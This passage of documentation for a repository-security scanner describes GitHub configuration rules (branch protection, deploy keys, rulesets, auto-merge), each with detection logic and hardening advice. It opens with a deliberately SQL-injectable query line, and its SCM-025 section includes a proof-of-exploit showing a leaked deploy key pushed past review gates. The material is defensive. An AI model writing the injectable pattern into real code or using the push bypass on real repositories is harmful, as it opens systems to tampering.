#   +     return db.query(f"SELECT * FROM u WHERE id = {user_id}")
#
# A reviewer skimming a 400-line PR misses this. Default
# CodeQL setup catches the same change as a CWE-89 finding
# in the PR check, surfaces it inline in the diff, and
# blocks the merge if the protection rule wires it up as
# a required status check (see SCM-008).

**Source:** [`SCM-003`](../providers/scm.md#scm-003) in the [SCM provider](../providers/scm.md).

#### `SCM-005`: Dependabot security updates are not enabled <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-005 }

**Evidences:** [`Dependency-Update-Tool`](#ctrl-dependency-update-tool) Project uses an automated dependency-update tool (Dependabot / Renovate), [`Vulnerabilities`](#ctrl-vulnerabilities) Project scans for and resolves known vulnerabilities.

**How this is detected.** Reads ``security_and_analysis.dependabot_security_updates.status`` from the repo metadata payload. Fires when the value is anything other than ``enabled``. Without security updates, the team has to discover and triage CVEs against their dependency graph manually — a delay measured in days or weeks even on attentive teams, vs hours when the bot opens the PR for them.

**Recommendation.** Enable Dependabot security updates under the repository's Settings -> Code security -> Dependabot. The bot opens a PR with the minimum-required upgrade for each open advisory against an in-use dependency. Pair with version-update config (``.github/dependabot.yml``) so routine bumps don't rely on the security-update path.

**Known false positives.**

- When the scanning token lacks ``admin`` scope on the repo, the ``security_and_analysis`` block is omitted from the API response and this rule cannot tell ``disabled`` from ``unknown``. Re-run with admin scope to confirm.
- Repos that delegate dependency-update PRs to Renovate, Snyk, or another bot get equivalent coverage without Dependabot. Suppress via ignore-file rather than removing the rule.

**Source:** [`SCM-005`](../providers/scm.md#scm-005) in the [SCM provider](../providers/scm.md).

#### `SCM-006`: Default branch protection does not require signed commits <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-006 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads ``required_signatures.enabled`` from the branch protection payload. Fires when the field is missing or False. Required signatures don't validate signature authenticity (the GitHub web UI does that lazily on render), but a missing signature is rejected at push time, which blocks the most common compromise pattern: a stolen personal access token used to push under the maintainer's name without their signing key.

**Recommendation.** In the default-branch protection rule, enable ``Require signed commits``. Configure GPG, SSH, or S/MIME signatures for every contributor's git client (``git config commit.gpgsign true`` plus an uploaded public key). Pair with branch protection's ``Restrict who can push to matching branches`` so only signed commits from authorized identities land on the default branch.

**Source:** [`SCM-006`](../providers/scm.md#scm-006) in the [SCM provider](../providers/scm.md).

#### `SCM-007`: Default branch protection allows force-pushes <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-007 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads ``allow_force_pushes.enabled`` from the branch protection payload. Fires when the value is True. The complementary deletion-protection knob is covered by ``SCM-009``; this rule focuses on the rewrite-history attack class because force-push is the primitive every post-incident rewrite uses to clean up after itself.

**Recommendation.** In the default-branch protection rule, set ``Allow force pushes`` to ``Disabled``. Force-pushes overwrite the audit trail; an attacker who lands a malicious commit can erase evidence of it after the fact. Also set ``Allow deletions`` to ``Disabled`` so the branch itself can't be wiped.

**Source:** [`SCM-007`](../providers/scm.md#scm-007) in the [SCM provider](../providers/scm.md).

#### `SCM-008`: Default branch protection does not require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-008 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads ``required_status_checks.contexts`` (or the newer ``checks`` shape) from the branch protection payload. Fires when the field is missing or the contexts list is empty. Without required checks the merge gate degrades to human-only review; SCM-002 covers the review knob, this rule covers the automated-verification knob, and both should be on for high-trust default branches.

**Recommendation.** In the default-branch protection rule, enable ``Require status checks to pass before merging`` and list every check the team relies on (CI build, code scanning, secret scanning, lint). Set ``strict: true`` (``Require branches to be up to date before merging``) so a stale base doesn't land regressions the latest checks would catch.

**Known false positives.**

- The ``restrictions`` block (users / teams / apps allowed to push directly to the protected branch) is not consulted today: a rule that requires status checks but lists every contributor in the push-restrictions allowlist still passes this rule even though those identities can land code without the checks running. Audit the allowlist in the GitHub UI when this rule passes on a high-trust repo.
- Status-check names are matched as opaque strings; a configured required check that no workflow actually emits (typo, deleted job) will still pass this rule. The check would block the merge in practice (GitHub waits for the named context forever), but the misconfiguration itself isn't visible from the protection payload.

**Source:** [`SCM-008`](../providers/scm.md#scm-008) in the [SCM provider](../providers/scm.md).

#### `SCM-009`: Default branch protection allows branch deletion <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-009 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads ``allow_deletions.enabled`` from the branch protection payload. Fires when the value is True. Pairs with SCM-007 (force-push allowed) — the two flags together cover the complete rewrite-history attack class.

**Recommendation.** In the default-branch protection rule, set ``Allow deletions`` to ``Disabled``. A deleted default branch wipes every protection rule attached to it; an attacker with write access can delete the branch, recreate it from a tampered commit, and re-apply protection in a way that looks identical from the UI.

**Source:** [`SCM-009`](../providers/scm.md#scm-009) in the [SCM provider](../providers/scm.md).

#### `SCM-010`: Branch protection allows administrators to bypass <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-010 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads ``enforce_admins.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with every other SCM-NNN rule that reads a branch-protection knob — without enforce_admins, those rules document intent rather than reality.

**Recommendation.** In the default-branch protection rule, enable ``Do not allow bypassing the above settings`` (a.k.a. ``Include administrators``). Otherwise every other knob you set (required reviews, status checks, signed commits) becomes advisory rather than enforced. A compromised admin account is also a much shorter path to a tampered release than a compromised contributor account, so admins are exactly the identity the gate needs to apply to.

**Source:** [`SCM-010`](../providers/scm.md#scm-010) in the [SCM provider](../providers/scm.md).

#### `SCM-011`: Default branch protection does not require CODEOWNERS reviews <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-011 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``required_pull_request_reviews.require_code_owner_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` covers the bare review-count knob; this rule scopes specifically to whose review counts. The check evaluates only the protection-rule toggle; verifying that an actual ``CODEOWNERS`` file exists at ``.github/CODEOWNERS`` (and covers the right paths) is left to the recommendation, since the GitHub API surfaces the file's presence as a separate contents request the SCM provider does not fetch.

**Recommendation.** In the default-branch protection rule, enable ``Require review from Code Owners``. Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (or ``docs/CODEOWNERS``) mapping directories to the team or individual responsible. The GitHub UI auto-requests review from the matched owners on every PR that touches a covered path; combined with this branch-protection knob, the merge is blocked until they approve.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path don't need the routing CODEOWNERS provides — but the protection knob still helps when a new team member joins. Suppress via ignore-file when the team intentionally stays flat.

**Source:** [`SCM-011`](../providers/scm.md#scm-011) in the [SCM provider](../providers/scm.md).

#### `SCM-012`: Default branch protection keeps stale reviews after a push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-012 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``required_pull_request_reviews.dismiss_stale_reviews`` from the branch protection payload. Fires when the value is False or the field is missing. ``SCM-002`` ensures a review is required at all; this rule ensures the approval the team relies on actually corresponds to the diff being merged.

**Recommendation.** In the default-branch protection rule, enable ``Dismiss stale pull request approvals when new commits are pushed``. Approvals will be cleared every time the PR head moves; the reviewer has to re-approve the latest diff before merge, closing the time-of-check / time-of-use gap an attacker can exploit by amending the branch after approval.

**Source:** [`SCM-012`](../providers/scm.md#scm-012) in the [SCM provider](../providers/scm.md).

#### `SCM-013`: Default branch protection does not require conversation resolution <span class="pg-sev pg-sev--low">LOW</span> { #detail-scm-013 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``required_conversation_resolution.enabled`` from the branch protection payload. Fires when the value is False or the field is missing. Severity is LOW because the rule documents process discipline rather than a structural vulnerability — but unresolved security comments are a common upstream cause of incidents.

**Recommendation.** In the default-branch protection rule, enable ``Require conversation resolution before merging``. PRs cannot land until every review comment is marked resolved. The friction is small (the PR author clicks ``Resolve`` after addressing) and the payoff is concrete: review comments can't be ignored to ship faster.

**Source:** [`SCM-013`](../providers/scm.md#scm-013) in the [SCM provider](../providers/scm.md).

#### `SCM-014`: Default branch protection does not require approval of the most recent push <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-014 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``required_pull_request_reviews.require_last_push_approval`` from the branch protection payload. Fires when the value is False or the field is missing. Pairs with SCM-012 (dismiss stale reviews) — both close the same approval-time-of-check / merge-time-of-use gap from different angles.

**Recommendation.** In the default-branch protection rule, enable ``Require approval of the most recent reviewable push``. The reviewer and the most recent pusher must be different identities; an attacker controlling one collaborator account can no longer ship a malicious diff under another collaborator's approval.

**Source:** [`SCM-014`](../providers/scm.md#scm-014) in the [SCM provider](../providers/scm.md).

#### `SCM-017`: Repository has no CODEOWNERS file <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-017 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Probes the three canonical CODEOWNERS locations via ``GET /repos/{owner}/{repo}/contents/<path>``. Fires when none of the three returns a file response. Pairs with SCM-011 (the protection-rule toggle): SCM-011 covers intent, SCM-017 covers reality. A repo with both set is auditing the path-scoped review actually happens.

**Recommendation.** Add a ``CODEOWNERS`` file at ``.github/CODEOWNERS`` (the GitHub-recommended location), ``CODEOWNERS`` at the repo root, or ``docs/CODEOWNERS``. Map directories to the team or individual responsible for them. With SCM-011's ``require_code_owner_reviews`` knob enabled, GitHub auto-requests review from the matched owners on every PR; without the file, the toggle is meaningless and any reviewer can approve any change.

**Known false positives.**

- Single-team repos where every contributor is a code owner of every path may legitimately skip CODEOWNERS — the file adds no routing in that case. Suppress via ignore-file when the team intentionally stays flat. The same suppression applies to SCM-011.

**Source:** [`SCM-017`](../providers/scm.md#scm-017) in the [SCM provider](../providers/scm.md).

#### `SCM-020`: Default workflow GITHUB_TOKEN has write permission <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-020 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Reads ``default_workflow_permissions`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. Values are ``"read"`` (safe) or ``"write"`` (fail). Requires the token to have ``admin`` scope on the repo; without it GitHub returns 403 and the rule passes silently with an unavailability note. Complements GHA-048 / GHA-049 — those catch the *workflow* asking for write; SCM-020 catches the *org / repo* handing out write by default.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, set the default to ``Read repository contents and packages permissions``. Workflows that genuinely need to push, comment on PRs, or modify issues opt in explicitly via the workflow-file ``permissions:`` block. The default ``write`` setting gives every workflow's ``GITHUB_TOKEN`` write access to every API surface the repo exposes (contents, issues, PRs, actions, packages, deployments), so a single compromised dependency in any job is one step away from the GHA-048 / GHA-049 worm-propagation primitives (workflow self-mutation, cross-repo push) the rule pack catches at the workflow-YAML layer. Setting the default to ``read`` is the org-side complement: even if a workflow forgets to declare ``permissions:`` and the compromised dep tries to push, GitHub refuses the operation.

**Known false positives.**

- Repos where every workflow legitimately needs write access (release-publishing automation, mirror-sync jobs) may set the default to ``write`` deliberately. The right pattern is still to keep the default at ``read`` and grant write at the workflow level — that way a new workflow (added by a future contributor) starts safe. Suppress only when every workflow in the repo carries an explicit ``permissions:`` block.

**Seen in the wild.**

- Shai-Hulud npm worm (2026): the worm's propagation primitive was a stolen ``GITHUB_TOKEN`` with ``contents: write`` and ``workflows: write``. Repos whose default workflow permissions were ``read`` were unaffected even when their workflows ran a compromised npm dep; ``write``-default repos handed the worm the keys.

**Source:** [`SCM-020`](../providers/scm.md#scm-020) in the [SCM provider](../providers/scm.md).

#### `SCM-021`: Actions can approve pull requests (self-approval bypass) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-021 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``can_approve_pull_request_reviews`` from ``GET /repos/{owner}/{repo}/actions/permissions/workflow``. ``True`` is the fail signal; ``False`` (or absent) passes. Requires admin scope on the repo. Complements SCM-002 / SCM-011 / SCM-014 — without SCM-021, those rules document intent rather than enforcement, because Actions can fulfil the review requirement itself.

**Recommendation.** In repo Settings → Actions → General → Workflow permissions, uncheck ``Allow GitHub Actions to create and approve pull requests``. With it on, any workflow whose ``GITHUB_TOKEN`` includes ``pull-requests: write`` can submit an approving review on a PR — including its own. Required-review controls (SCM-002), CODEOWNERS reviews (SCM-011), and last-push approval (SCM-014) all become advisory once Actions can satisfy their own gate. A compromised dependency that opens a PR can immediately approve and merge it without any human in the loop.

**Known false positives.**

- Some orgs allow Actions self-approval as part of a tightly-scoped automation flow (e.g., a code-formatter bot that opens-and-merges its own PRs). The safer pattern is to grant the bot a dedicated PAT scoped to PR-create-and-approve, not the repo-wide GITHUB_TOKEN. Suppress only when the trade-off has been documented.

**Source:** [`SCM-021`](../providers/scm.md#scm-021) in the [SCM provider](../providers/scm.md).

#### `SCM-022`: Repo Actions permissions allow any source (no allow-list) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-022 }

**Evidences:** [`Pinned-Dependencies`](#ctrl-pinned-dependencies) Dependencies (actions, images, includes, packages) are pinned to immutable references from trusted sources.

**How this is detected.** Reads ``allowed_actions`` from ``GET /repos/{owner}/{repo}/actions/permissions``. Values: ``"selected"`` (allow-listed) and ``"local_only"`` (org-internal only) pass; ``"all"`` (no restriction) fails. Requires admin scope. The rule passes silently when Actions is disabled at the repo level (``enabled: false``) — nothing runs, so the source restriction is moot.

**Recommendation.** In repo Settings → Actions → General → Actions permissions, set the allow-list mode to ``Allow <owner>, and select non-<owner>, actions and reusable workflows`` (``selected``) and curate a list of trusted publishers. Each new third-party action becomes an explicit decision rather than the result of a workflow writer adding ``uses: random/unknown@v1`` and CI silently executing it. The shipped pack of GHA-040 (compromised-action registry) plus GHA-041..047 (action reputation checks) provides the workflow-time signal; SCM-022 is the org-policy gate that says ``don't even let an untrusted action onto the runner.``

**Known false positives.**

- Repos that legitimately consume a wide variety of third-party actions (open-source CI examples, marketplace-aggregator demos) may accept the ``all`` mode as a trade-off. The right defense in that case is rigorous SHA-pinning (GHA-001) plus the GHA-040..047 reputation pack; SCM-022 is the org-level allow-list that becomes redundant when every workflow already pins to a vetted commit.

**Source:** [`SCM-022`](../providers/scm.md#scm-022) in the [SCM provider](../providers/scm.md).

#### `SCM-023`: Deployment environment lacks required-reviewer protection <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-023 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/environments`` and flags every environment whose ``protection_rules`` list doesn't include a rule with ``type == "required_reviewers"``. Passes silently when no environments are configured (``total_count: 0``) — there's nothing to evaluate. Pairs with GHA-050 (the workflow-layer rule that checks ``jobs.<id>.environment:`` is declared) and SCM-024 (deployment-branch-policy on the same environments).

**Recommendation.** Configure required reviewers on every deployment environment (Settings → Environments → <name> → ``Required reviewers``). Pick a team or set of users who must approve each deployment job that targets the environment. Without a required-reviewer protection rule, any workflow run with the right environment name in its ``jobs.<id>.environment:`` block can deploy without human gate — the exact primitive GHA-050 (publish without OIDC + environment) catches at the workflow layer. SCM-023 is the org-level complement: a workflow that *declares* an environment still needs the environment itself to enforce the gate.

**Known false positives.**

- Non-production environments (``preview``, ``staging-ephemeral``) that legitimately auto-deploy without human gate are flagged by this rule, since GitHub doesn't distinguish environment severity. Suppress on those specific environment names with a rationale rather than disabling the rule for the whole repo.

**Source:** [`SCM-023`](../providers/scm.md#scm-023) in the [SCM provider](../providers/scm.md).

#### `SCM-024`: Deployment environment can deploy from any branch <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-024 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Reads each environment's ``deployment_branch_policy`` field. ``null`` means any branch can deploy and fails; ``{"protected_branches": true}`` or ``{"custom_branch_policies": true}`` (with at least one configured policy) passes. Passes silently when no environments are configured. Pairs with SCM-023 (required reviewers on the same environments); both knobs together close the deploy-gate loop.

**Recommendation.** Configure a deployment-branch policy on every environment (Settings → Environments → <name> → ``Deployment branches and tags``). Pick ``Protected branches only`` for production-like environments so a workflow run on a feature branch cannot push to production. The combination ``required reviewers`` (SCM-023) + ``deployment branch policy`` (SCM-024) is the deploy-gate the rest of the rule pack (GHA-050 publish-without-OIDC, SCM-001 branch protection) assumes is in place; without SCM-024, a workflow on any branch can target the production environment and reviewers approve a stale or wrong-branch deployment without realizing.

**Known false positives.**

- Test / preview environments often accept any branch by design (the whole point is to validate feature branches before merging). Suppress on those specific environment names; treat the rule as production-scoped.

**Source:** [`SCM-024`](../providers/scm.md#scm-024) in the [SCM provider](../providers/scm.md).

#### `SCM-025`: Repo has write-enabled deploy keys (push backdoor) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-025 }

**Evidences:** [`Token-Permissions`](#ctrl-token-permissions) CI tokens are scoped to the minimum required permissions.

**How this is detected.** Reads ``GET /repos/{owner}/{repo}/keys`` and flags every deploy key whose ``read_only`` field is false. Requires ``admin`` scope on the repo; without it GitHub returns 403 / 404 and the rule passes silently with an unavailability note. Deploy keys come in two shapes: read-only (clone access only, safe equivalent of a public-fork checkout) and write-enabled (push access, the failure case this rule catches). The endpoint returns the SSH public key plus metadata, never the private half — the scan can't recover the credential, only enumerate which keys exist and what scope each carries.

Complements every branch-protection rule in the pack: without SCM-025, an unaudited write deploy key bypasses the entire control set the other rules document. Also pairs with SCM-018 (PR-review bypass allowance) and SCM-019 (push-restriction allowlist), which catch the same risk shape on the user / team side.

**Recommendation.** Convert every deploy key to read-only (Settings → Deploy keys → uncheck ``Allow write access``), then rotate the underlying SSH key pair if the previous holder no longer needs write access. Deploy keys are repo-scoped SSH credentials that bypass GitHub's normal RBAC — anyone with the private half can push directly, side-stepping branch protection (SCM-001), required reviews (SCM-002), CODEOWNERS (SCM-011), and the user-account audit trail. If the use case genuinely needs push (a CI runner that tags releases, a release-bot account), prefer a fine-grained PAT or a GitHub App with constrained scope, both of which carry user-visible audit-log entries that deploy keys do not.

**Known false positives.**

- Some CI flows legitimately use a write deploy key for release tagging or auto-generated docs commits. The right pattern is a GitHub App or a fine-grained PAT with an audit trail; deploy keys persist indefinitely and leave no record of who used them. Suppress with a one-line rationale that names the specific key title.

**Seen in the wild.**

- Long-running pattern of forgotten deploy keys retaining write access years after the original owner left an org. Public catalogs of leaked SSH private keys on paste sites and GitHub itself routinely hit configured deploy keys; the corresponding repo is push-compromised until the operator revokes the key.

**Proof of exploit.**

# Vulnerable: a write-enabled deploy key sits on the repo
# for years. The private half lived on a contractor's
# laptop and was checked into a public gist during a
# transient debug session.
GET /repos/acme/payments-api/keys
[
  {
    "id": 42,
    "title": "ci-runner-prod (added 2021-03)",
    "key": "ssh-ed25519 AAAA... ci-runner",
    "read_only": false,
    "created_at": "2021-03-04T10:00:00Z"
  }
]

# Attack: ``git push git@github.com:acme/payments-api.git``
# using the leaked private key writes directly to master,
# bypassing every required-review / CODEOWNERS / status-
# check gate the other SCM rules document. The push shows
# up in the audit log as ``key:42`` rather than a user
# account, so detection requires correlation across
# audit-log events most operators never review.

# Safe: revoke the deploy key. If write access is
# genuinely required for CI tagging, switch to a GitHub
# App with constrained scope plus a one-line audit-log
# entry per push.

**Source:** [`SCM-025`](../providers/scm.md#scm-025) in the [SCM provider](../providers/scm.md).

#### `SCM-027`: Outside collaborator holds write / maintain / admin access <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-027 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/collaborators?affiliation=outside`` and flags every entry whose ``permissions`` block has any of ``admin: true``, ``maintain: true``, or ``push: true``. Read-only (``permissions.pull: true`` with no higher tier) and triage entries pass. Each finding's description names every elevated collaborator with the granular level so the operator can prioritize.

Requires admin scope on the repo to enumerate the outside-collaborator list; without it the endpoint returns 403 and the rule passes silently with an unavailability note. The hydrator fetches a single page (``per_page=100``); in the rare case of more than 100 outside collaborators on one repo, the description appends a truncation note and asks for a manual audit.

**Recommendation.** Audit Settings → Collaborators and teams → Outside collaborators. For each entry the rule flagged: either (a) downgrade the access to ``Read`` if the contributor only needs to clone / open PRs, or (b) move the account into the org as a member (so the org's centralized RBAC, SCIM, and access-review processes apply) before granting write access. Outside collaborators bypass the org's user-lifecycle controls: when the contractor's term ends, the entry stays until somebody manually removes it. A compromised outside-collab account with ``push`` access is the direct path to bypassing branch protection: that account can push code that SCM-021 (Actions self-approval) or SCM-018 (PR bypass allowance) clears through every required-review gate. Maintain / admin extends the blast radius to repo-config control.

**Known false positives.**

- Some flows legitimately grant write access to a vetted outside collaborator on a short-term basis (audit firm, incident responder, vendor escalation). The right compensating control is a calendar-bound suppression with the rationale and the expected revocation date; the rule itself should keep flagging the access so the revocation date is visible at every scan.

**Seen in the wild.**

- Long-running pattern across compromise postmortems: a former contributor's outside-collaborator entry retains ``push`` access years after the engagement ended. The account is then taken over (often by credential stuffing or a leaked PAT), and the attacker pushes a tampered commit that lands without review because the access level itself is the gate.

**Source:** [`SCM-027`](../providers/scm.md#scm-027) in the [SCM provider](../providers/scm.md).

#### `SCM-029`: Repository ruleset is in evaluate / disabled mode (not enforced) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-029 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** Walks ``GET /repos/{owner}/{repo}/rulesets`` and flags every entry whose ``enforcement`` is anything other than ``"active"``. Two failure shapes are typical:

* ``enforcement: "evaluate"`` — preview / dry-run mode;   the ruleset logic runs but doesn't block.
* ``enforcement: "disabled"`` — explicit off; rule   exists in the UI but takes no effect.

Passes silently when no rulesets are configured (``[]``); in that case the SCM-001..010 legacy branch-protection rules carry the governance load. Requires admin scope on the repo; without it the endpoint returns 403 / 404 and the rule passes silently with an unavailability note.

**Recommendation.** Flip every non-enforcing ruleset to ``enforcement: active`` (Settings → Rules → Rulesets → <name> → Enforcement status → Active). The ``evaluate`` mode is intentionally permissive: it runs the rule logic and surfaces what *would* have been blocked, but it never actually blocks the push, merge, or commit. ``disabled`` is the explicit off-switch. Both modes silently document intent without enforcing the policy — operators commonly create rulesets in ``evaluate`` to preview their effect and forget to flip them, leaving the repo with the audit appearance of governance and the behavior of none.

Note: the legacy-branch-protection rules in this pack (SCM-001..010) do NOT see rulesets. An org that has fully migrated to rulesets can pass the entire SCM-NNN legacy pack while every actual governance signal is in evaluate mode.

**Known false positives.**

- A freshly-authored ruleset legitimately sits in ``evaluate`` mode for a short audit window before promotion to ``active``. Suppress for that specific ruleset id with a calendar-bound rationale; the rule should keep flagging until the promotion lands so the transition window doesn't quietly become permanent.

**Source:** [`SCM-029`](../providers/scm.md#scm-029) in the [SCM provider](../providers/scm.md).

#### `SCM-030`: Repository ruleset has bypass actor with bypass_mode: always <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-030 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For each ``active`` ruleset, walks ``bypass_actors`` (populated by the per-ruleset detail fetch) and flags every entry with ``bypass_mode: "always"`` whose ``actor_type`` is not ``"Integration"`` (GitHub Apps). Non-app actors are listed by ``actor_type`` + ``actor_id``; the rule does not resolve those IDs to human-readable names (that would require another API round-trip per actor; the operator already sees the names in the UI when they go to fix it).

Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-enforced-at-all case and a non-active ruleset's bypass list is moot since the rules don't run anyway. Integration bypasses pass: a scoped GitHub App is a typical legitimate emergency-fix channel and shipping the bypass through the App's audit flow is the documented pattern. Requires admin scope; without it the ruleset-detail endpoint returns 403 / 404 and the rule passes silently.

**Recommendation.** For every bypass actor flagged, switch ``bypass_mode`` from ``always`` to ``pull_request`` in the ruleset configuration (Settings → Rules → <ruleset> → Bypass list → <actor> → Bypass mode). The ``pull_request`` mode requires the bypass to be requested via a PR review thread, which leaves an audit trail and gives reviewers a chance to push back. ``always`` mode is an unaudited override: the actor pushes / merges as if the ruleset weren't there, and no record names who or why. If the bypass is genuinely needed for emergency response, scope it to a specific GitHub App (the rule does not flag ``Integration`` bypasses by default) rather than a human role; an App is callable through your existing ticketing / approval flow.

**Known false positives.**

- Some orgs grant ``always`` bypass to a tightly-scoped automation team for after-hours emergency response. The right pattern is a GitHub App with auditable triggering (PagerDuty, Slack); ``always`` bypass for a human team leaves no record of the override. Suppress on the specific ruleset id with a calendar-bound rationale that names the audit channel and the next promotion review.

**Source:** [`SCM-030`](../providers/scm.md#scm-030) in the [SCM provider](../providers/scm.md).

#### `SCM-031`: Repo allows auto-merge (no human-timing gate) <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-031 }

**Evidences:** [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** Reads ``allow_auto_merge`` from the repo metadata (already fetched by every SCM scan; no extra endpoint). Fires when the value is ``true``. A missing field is treated as the GitHub default (``false``) and passes. The check is intentionally orthogonal to whether reviews are required — auto-merge with strong required-review controls is sometimes acceptable, auto-merge with weak ones is not. SCM-031 surfaces the trade-off; the operator pairs the finding with the SCM-002 / SCM-011 / SCM-014 / SCM-021 status to decide whether to keep auto-merge.

**Recommendation.** In repo Settings → General → Pull Requests, uncheck ``Allow auto-merge``. With auto-merge on, the PR merges the moment its required checks pass — including any required reviews already on the PR — with no further human gate on *when* the merge happens. The risk is compositional: combined with SCM-021 (Actions can self-approve PRs) or SCM-018 (PR-review bypass allowance), a workflow that opens a PR, satisfies its own required-review gate, and waits for status checks lands code into main without a human ever looking at the diff at the merge moment. If the workflow itself is what was compromised (Shai-Hulud, postinstall worm), the auto-merge step is the last gate that didn't fire.

If your team relies on auto-merge for throughput, the compensating controls are SCM-021 (Actions cannot self-approve), SCM-002 (required reviews ≥ 1), SCM-011 (CODEOWNERS reviews required), and SCM-014 (last-push approval) — all together. Without all four, auto-merge is the path of least resistance for an unauthored commit to reach main.

**Known false positives.**

- High-throughput engineering orgs that pair auto-merge with rigorous required-reviews + CODEOWNERS + last-push approval + no-Actions-self-approval (SCM-021) legitimately depend on auto-merge for velocity. The right pattern is to suppress this rule with a rationale that names the compensating controls so the trade-off stays visible at every audit. Suppressing without naming the controls makes the trade-off invisible to the next reviewer.

**Source:** [`SCM-031`](../providers/scm.md#scm-031) in the [SCM provider](../providers/scm.md).

#### `SCM-032`: Active ruleset doesn't require a PR review (governance theater) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-scm-032 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review, [`Code-Review`](#ctrl-code-review) Changes merged to the default branch require review.

**How this is detected.** For every active ruleset (``enforcement: "active"``) with an evaluable detail body, walks the ``rules`` array looking for an entry with ``type: "pull_request"`` whose ``parameters.required_approving_review_count`` is at least 1. Fires when none is found. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced with an evaluation-gap note (the same pattern SCM-030 uses).

Pairs with SCM-002 (legacy branch-protection required reviews) and SCM-029 (ruleset not enforced). The three rules together cover the required-review surface: SCM-002 for legacy BP, SCM-029 for the existence of an active ruleset, SCM-032 for whether that ruleset actually requires a PR.

**Recommendation.** Add a ``pull_request`` rule to every active ruleset and set ``parameters.required_approving_review_count`` to at least 1 (Settings → Rules → <ruleset> → Add rule → Require a pull request before merging → Required approvals). An active ruleset without a PR-review gate is the same shape as legacy branch protection without required reviews (SCM-002): the ruleset is enforced — force-push denial, signed commits, status checks may all fire — but pushes / merges still go through without human review. Operators commonly create rulesets for specific governance signals (e.g., commit-message patterns for compliance) and forget that the PR-review gate is a separate rule type that has to be added explicitly.

SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-protection state, so it fires on any active ruleset that lacks a PR-review rule, even when legacy branch protection on the same ref provides the required-review gate. SCM-002 covers the legacy branch-protection side; the two rules together describe the full review-control surface.

**Known false positives.**

- Some rulesets are deliberately scoped to enforce only non-PR-review controls (e.g., a ``commit_message_pattern`` ruleset for changelog compliance, or a ``tag_name_pattern`` ruleset for release tagging). The right pattern is to ALSO have a separate ruleset that enforces PR reviews on the same refs; SCM-032 fires when the *combination* leaves a gap. Suppress on the specific ruleset id with a rationale that names the PR-review channel (separate ruleset or legacy branch protection).

**Source:** [`SCM-032`](../providers/scm.md#scm-032) in the [SCM provider](../providers/scm.md).

#### `SCM-033`: Active ruleset doesn't require status checks <span class="pg-sev pg-sev--medium">MEDIUM</span> { #detail-scm-033 }

**Evidences:** [`Branch-Protection`](#ctrl-branch-protection) Default branch is protected against force-push, deletion, and direct push without review.

**How this is detected.** For every active ruleset, walks the merged ``rules`` array looking for an entry with ``type: "required_status_checks"`` whose ``parameters.required_status_checks`` lists at least one context. Empty lists are treated as no rule. Non-active rulesets are SCM-029's surface; rulesets with unavailable detail are surfaced explicitly. Passes silently when no rulesets are configured (legacy branch-protection SCM-008 covers the gap).

